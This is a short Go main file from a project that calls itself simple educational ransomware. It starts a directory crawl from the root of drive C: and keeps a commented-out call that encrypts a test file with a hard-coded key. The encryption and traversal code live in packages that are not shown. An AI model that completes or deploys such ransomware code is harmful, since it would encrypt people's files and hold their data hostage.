package main

import (
	"rango/pkg/MapDirectories"
)

/*
Simple ransomware written in go for educational purposes
*/

func main() {
	rootDir := "C:/"
	MapDirectories.ReadAllDir(rootDir)
	/*
		inputFile := "./test.txt"
		key := []byte("estaesunaclave123456789012345678")
		err := crypt.EncryptFile(inputFile, key)
		if err != nil {
			log.Fatal(err)
		}
	*/
}
